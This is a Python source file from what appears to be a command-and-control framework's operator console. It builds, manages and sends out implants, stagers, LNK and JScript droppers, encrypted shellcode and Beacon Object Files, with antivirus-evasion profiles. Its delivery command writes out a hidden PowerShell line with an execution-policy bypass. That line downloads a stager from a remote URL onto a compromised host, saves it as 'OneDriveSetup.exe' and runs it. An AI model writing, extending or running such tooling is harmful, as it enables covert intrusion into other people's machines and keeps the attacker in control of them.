"""BuildMixin — payload build, generate, and module reload commands."""

import sys
from pathlib import Path

# ── Builder (bab package) ──────────────────────────────────────────────────────
_BUILDER_DIR  = Path(__file__).parent.parent / "builder"
_BACKDOORS_DIR = Path(__file__).parent.parent / "backdoors"

if str(_BUILDER_DIR) not in sys.path:
    sys.path.insert(0, str(_BUILDER_DIR))

try:
    from bab.config import (
        load_config  as load_build_cfg,
        save_config  as save_build_cfg,
        show_config  as show_build_cfg,
        edit_config  as edit_build_cfg,
        DEFAULT_CONFIG as _BUILD_DEFAULTS,
    )
    from bab.build    import build_all, build_stager, build_implant, encrypt_shellcode_file
    from bab.zip      import embed_in_zip as _local_embed_in_zip
    from bab.loader   import rebuild_stub as _rebuild_thornldr_stub  # no circular dep via cargo.py
    from bab.jscript  import do_stager as jscript_stager
    from bab.lnk      import do_lnk
    from bab.zip      import embed_in_zip
    from bab.generate import generate_implant, generate_station, list_generators
    from bab.assemble import select_implant_components, select_stager_component, select_profile
    from bab.bof      import do_bof as _do_bof_pack, rebuild_stub as _rebuild_bof_stub
    HAS_BUILDER = True
except ImportError as _bab_err:
    HAS_BUILDER  = False
    _bab_err_str = str(_bab_err)
    _BUILD_DEFAULTS = {}

from .ui import ok, err, info, warn, bold, cyan, grey, table, fmt_ts
from .api import load_config, check


class BuildMixin:

    # ── Guards and config helpers ─────────────────────────────────────────────

    def _build_guard(self, require_cargo=False):
        if not HAS_BUILDER:
            err(f"Builder not available: {_bab_err_str}")
            err(f"Expected bab package at: {_BUILDER_DIR / 'bab'}")
            return False
        if require_cargo:
            import shutil, os
            cargo_bin = Path(os.environ.get("CARGO_HOME", Path.home() / ".cargo")) / "bin"
            if not shutil.which("cargo") and not (cargo_bin / "cargo").exists():
                err("cargo not found — Rust is not installed on this machine.")
                info("Build commands that compile (all, stager, implant) must run on the build machine.")
                info("Install Rust:  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
                return False
        return True

    def _build_cfg(self):
        """Load build config from disk (or defaults if not yet configured)."""
        return load_build_cfg()

    # ── build ─────────────────────────────────────────────────────────────────

    def do_build(self, arg):
        """build [show|config|local|implant|stager|jscript|lnk|zip|station|thornldr|thornbof|encrypt|bof|deliver]  —  Payload builder"""
        parts = arg.strip().split()
        sub   = parts[0].lower() if parts else ""

        if not self._build_guard(): return
        dispatch = {
            "show":     self._do_build_status,
            "config":   self._do_build_config,
            "local":    lambda: self._do_build_local(parts[1] if len(parts) > 1 else ""),
            "implant":  lambda: self._do_build_implant_cmd(parts[1].lower() if len(parts) > 1 else ""),
            "stager":   lambda: self._do_build_stager_cmd(parts[1].lower() if len(parts) > 1 else ""),
            "jscript":  self._do_build_jscript,
            "lnk":      self._do_build_lnk,
            "zip":      self._do_build_zip,
            "station":  lambda: self._do_build_station(parts[1] if len(parts) > 1 else ""),
            "deliver":  self._do_build_deliver,
            "encrypt":   lambda: self._do_build_encrypt(parts[1:]),
            "thornldr":  self._do_build_thornldr,
            "bof":       lambda: self._do_build_bof(parts[1:]),
            "thornbof":  self._do_build_thornbof,
        }
        if sub in dispatch:
            dispatch[sub]()
        else:
            self.do_help("build")

    def _do_build_status(self):
        cfg  = self._build_cfg()
        show_build_cfg(cfg)

    def _do_build_config(self):
        cfg       = self._build_cfg()
        thorn_cfg = load_config()
        if thorn_cfg and cfg.get("station") == thorn_cfg["url"].rstrip("/"):
            info(f"Station URL synced from Thorn connection: {cyan(cfg['station'])}")
        edit_build_cfg(cfg)

    def _submit_build(self, build_type: str):
        """Prompt for component selections, then run or submit the build."""
        cfg = self._build_cfg()

        # Show AV target profiles first; Advanced falls through to manual selection
        print()
        profile_cfg = select_profile()
        if profile_cfg is not None:
            cfg.update(profile_cfg)
        else:
            if build_type in ("all", "zip", "implant"):
                cfg.update(select_implant_components())
            if build_type in ("all", "zip", "stager"):
                cfg.update(select_stager_component())

        if cfg.get("build_location", "server") == "local":
            self._run_local_build(build_type, cfg)
            return

        s, url = self._session()
        if not s: return
        resp = check(s.post(f"{url}/api/build", json={"type": build_type, "config": cfg}))
        if not resp: return
        try:
            job_id = resp.json()["job_id"]
        except Exception:
            err(f"Unexpected response: {resp.text[:200]}")
            return
        self._build_monitor.add_job(job_id, build_type)
        ok(f"Build queued on server  {cyan(job_id)}")
        info("You'll be notified when the build completes and artifacts are downloaded.")

    def _run_local_build(self, build_type: str, cfg: dict):
        """Run a cargo build in-process on this machine. Mirrors server_build.py."""
        if not self._build_guard(require_cargo=True): return
        info(f"Building {cyan(build_type)} locally …")
        # Rebuild ThornLDR stub (mirrors server_build.py behavior).
        loader_features = cfg.get("loader_features") or None
        if build_type in ("all", "implant", "zip"):
            try:
                _rebuild_thornldr_stub(features=loader_features)
            except Exception as e:
                err(f"ThornLDR stub rebuild failed: {e}")
                return
        try:
            if build_type == "all":
                success = build_all(cfg)
            elif build_type == "stager":
                success = build_stager(cfg)
            elif build_type == "implant":
                success = build_implant(cfg)
            elif build_type == "zip":
                success = build_all(cfg) and _local_embed_in_zip(cfg)
            else:
                err(f"Unknown build type: {build_type}")
                return
        except Exception as e:
            err(f"Local build raised: {e}")
            return
        if success:
            ok(f"Local {build_type} build complete.")
        else:
            err(f"Local {build_type} build failed.")

    def _do_build_local(self, arg: str):
        """Toggle/show build location (local vs server)."""
        cfg  = self._build_cfg()
        curr = cfg.get("build_location", "server")
        arg  = (arg or "").strip().lower()
        if arg in ("", "status", "show"):
            info(f"Build location: {cyan(curr)}")
            info(grey("  build local on     — compile on this machine (requires cargo)"))
            info(grey("  build local off    — submit jobs to the C2 server"))
            return
        if arg in ("on", "local", "true", "1"):
            new = "local"
        elif arg in ("off", "server", "false", "0"):
            new = "server"
        elif arg == "toggle":
            new = "server" if curr == "local" else "local"
        else:
            err(f"Unknown: build local {arg}")
            info("Usage: build local [on|off|status|toggle]")
            return
        cfg["build_location"] = new
        save_build_cfg(cfg)
        ok(f"Build location → {cyan(new)}")
        if new == "local":
            self._build_guard(require_cargo=True)

    def _do_build_all(self):
        self._submit_build("all")

    def _do_build_stager(self):
        self._submit_build("stager")

    def _do_build_stager_cmd(self, lang: str):
        if not lang:
            generators = list_generators()
            print(f"\n  {bold('Available stager languages:')}")
            print(f"    {cyan('rust'):<16}  {grey('compiled Windows x64  (queued on server)')}")
            for l, types in generators.items():
                if "stager" in types:
                    print(f"    {cyan(l.lower()):<16}  {grey('interpreted')}")
            print()
            return
        if lang == "rust":
            self._do_build_stager()
        else:
            self.do_generate(f"stager {lang}")

    def _do_build_implant_cmd(self, lang: str):
        if not lang:
            generators = list_generators()
            print(f"\n  {bold('Available implant languages:')}")
            print(f"    {cyan('rust'):<16}  {grey('compiled Windows x64  (queued on server)')}")
            for l, types in generators.items():
                if "implant" in types:
                    print(f"    {cyan(l.lower()):<16}  {grey('interpreted')}")
            print()
            return
        if lang == "rust":
            self._do_build_implant()
        else:
            self.do_generate(lang)

    def _do_build_implant(self):
        self._submit_build("implant")

    def _do_build_thornldr(self):
        """Force-recompile the ThornLDR stub and update the cache."""
        if not self._build_guard(require_cargo=True): return
        _rebuild_thornldr_stub()

    def _do_build_thornbof(self):
        """Force-recompile the COFF loader stub and update the cache."""
        if not self._build_guard(require_cargo=True): return
        _rebuild_bof_stub()

    def _do_build_bof(self, args: list):
        """Pack a COFF .o BOF file for inline dispatch to the active rat."""
        if not args:
            err("Usage: build bof <file.o>")
            info("Packs and encrypts a Beacon Object File for BOF_INLINE dispatch.")
            info("Use  run bof_inline  to dispatch the result to the active rat.")
            return
        bof_path = args[0]
        cfg = self._build_cfg()
        b64 = _do_bof_pack(bof_path, cfg)
        if not b64:
            return
        if not self._need_rat(): return
        s, url = self._session()
        if not s: return
        module_id = self._find_module_by_type(s, url, "bof_inline")
        if not module_id:
            err("bof_inline module not found — check modules are loaded")
            return
        task_id, _ = self._dispatch_task(s, url, module_id, {"payload": b64}, wait=True)
        if task_id:
            ok(f"BOF task complete  {cyan(task_id)}")
            info(f"Run  {grey(f'output {task_id}')}  to see output")

    def _do_build_station(self, lang: str = ""):
        self.do_generate(f"station {lang}" if lang else "station")

    def _do_build_jscript(self):
        jscript_stager(self._build_cfg())

    def _do_build_lnk(self):
        do_lnk(self._build_cfg())

    def _do_build_zip(self):
        self._submit_build("zip")

    def _do_build_deliver(self):
        """Download + execute stager on the active rat via PowerShell."""
        if not self._need_rat(): return
        cfg        = self._build_cfg()
        stager_url = cfg.get("stager_url", "")
        if not stager_url or stager_url == _BUILD_DEFAULTS.get("stager_url"):
            err("Stager URL not configured — run: build config")
            return
        s, url = self._session()
        if not s: return
        module_id = self._find_shell_module(s, url)
        if not module_id: return
        stager_filename = cfg.get("stager_filename", "OneDriveSetup.exe")
        ps = (
            f"$p='$env:TEMP\\{stager_filename}';"
            f"(New-Object Net.WebClient).DownloadFile('{stager_url}',$p);"
            f"Start-Process $p"
        )
        command = f'powershell -w hidden -ep bypass -c "{ps}"'
        info(f"Stager URL:  {cyan(stager_url)}")
        info(f"Target rat:  {cyan(self.active_rat[:32])}")
        task_id, _ = self._dispatch_task(s, url, module_id, {"command": command}, wait=False)
        if task_id:
            ok(f"Delivery task dispatched  {cyan(task_id)}")
            info(f"Run  {grey(f'output {task_id}')}  to verify execution")

    def _do_build_encrypt(self, args: list):
        """Encrypt a shellcode file with AES-256-CBC using the build config key/IV."""
        if not args:
            err("Usage: build encrypt <input_file> [output_file]")
            info("Encrypts a raw shellcode file so it can be served for the shellcode_load module.")
            info("The implant decrypts using the same key/IV as its C2 comms.")
            return
        input_path  = Path(args[0]).expanduser()
        output_path = Path(args[1]).expanduser() if len(args) > 1 else input_path.with_suffix(".enc")
        encrypt_shellcode_file(input_path, output_path, self._build_cfg())

    def complete_build(self, text, line, begidx, endidx):
        subs = ["show", "config", "local ", "implant ", "stager ", "jscript", "lnk", "zip", "station", "thornldr", "thornbof", "encrypt", "bof ", "deliver"]
        if "local " in line:
            return [o for o in ("on", "off", "status", "toggle") if o.startswith(text)]
        if "encrypt" in line or "bof " in line:
            return self._path_complete(text, line, begidx)
        gens = list_generators()
        if "implant " in line:
            langs = ["rust"] + [l.lower() for l in gens if "implant" in gens[l]]
            return [l for l in langs if l.startswith(text)]
        if "stager " in line:
            langs = ["rust"] + [l.lower() for l in gens if "stager" in gens[l]]
            return [l for l in langs if l.startswith(text)]
        return [s for s in subs if s.startswith(text)]

    # ── generate ──────────────────────────────────────────────────────────────

    def do_generate(self, arg):
        """generate [implant|station] [language]  —  Assemble a payload from component snippets"""
        if not self._build_guard(): return
        parts      = arg.strip().lower().split()
        generators = list_generators()

        if not parts:
            print(f"\n  {bold('Available generators:')}")
            for lang, types in generators.items():
                print(f"    {cyan(lang.lower()):<16}  {grey('  ·  '.join(types))}")
            print(f"\n  {grey('build <language>'):<38}  build implant")
            print(f"  {grey('build station'):<38}  build station")
            print()
            return

        artifact = "implant"
        if parts[0] in ("implant", "station"):
            artifact = parts[0]
            parts    = parts[1:]

        if not parts:
            print(f"\n  {bold(f'Available {artifact} generators:')}")
            for lang, types in generators.items():
                if artifact in types:
                    print(f"    {cyan(lang.lower())}")
            print()
            return

        lang_input = parts[0]
        match      = next((l for l in generators if l.lower().startswith(lang_input)), None)
        if not match:
            err(f"Unknown language: {lang_input}")
            info("Available: " + "  ".join(l.lower() for l in generators))
            return

        if artifact not in generators.get(match, []):
            err(f"No {artifact} components available for {match}")
            return

        cfg = self._build_cfg()
        if artifact == "station":
            generate_station(match, cfg)
        else:
            generate_implant(match, cfg)

    # ── implants / stagers / stations listings ────────────────────────────────

    def _list_backdoor_dir(self, subdir: str, title: str, search: str = ""):
        """List files under backdoors/<subdir>/."""
        d = _BACKDOORS_DIR / subdir
        if not d.exists() or not any(d.iterdir()):
            info(f"No {title.lower()} found in backdoors/{subdir}/")
            return
        files = sorted(
            (f for f in d.iterdir() if f.is_file() and (not search or search in f.name)),
            key=lambda f: f.stat().st_mtime, reverse=True,
        )
        if not files:
            info(f"No {title.lower()} matching '{search}'")
            return
        rows = [[cyan(f.name), f"{f.stat().st_size:,} bytes", fmt_ts(f.stat().st_mtime * 1000)]
                for f in files]
        table(rows, ["Filename", "Size", "Generated"],
              title=f"{title}  {grey(f'({len(files)} files)')}")

    def do_implants(self, arg):
        """implants [search]  —  List generated implants"""
        self._list_backdoor_dir("implants", "Implants", arg.strip())

    def do_stagers(self, arg):
        """stagers [search]  —  List generated stagers"""
        self._list_backdoor_dir("stagers", "Stagers", arg.strip())

    def do_stations(self, arg):
        """stations [search]  —  List generated stations"""
        self._list_backdoor_dir("stations", "Stations", arg.strip())

    # ── shellcode ─────────────────────────────────────────────────────────────

    def do_shellcode(self, arg):
        """shellcode  —  List built shellcode files"""
        sc_dir = _BACKDOORS_DIR / "implant"
        if not sc_dir.exists() or not any(sc_dir.iterdir()):
            info("No shellcode found in backdoors/implant/")
            return
        files = sorted((f for f in sc_dir.iterdir() if f.is_file()),
                       key=lambda f: f.stat().st_mtime, reverse=True)
        if not files:
            info("No shellcode files in backdoors/implant/")
            return
        cfg  = load_config()
        base = cfg["url"].rstrip("/") if cfg else ""
        rows = [[cyan(f.name), f"{f.stat().st_size:,} bytes",
                 fmt_ts(f.stat().st_mtime * 1000),
                 grey(f"{base}/shellcode/{f.name}")] for f in files]
        table(rows, ["Filename", "Size", "Modified", "URL"],
              title="Shellcode files")

    # ── reload ────────────────────────────────────────────────────────────────

    def do_reload(self, arg):
        """reload  —  Reload modules from disk"""
        s, url = self._session()
        if not s: return
        resp = check(s.put(f"{url}/api/reload_modules"))
        if resp:
            ok("Modules reloaded from disk.")
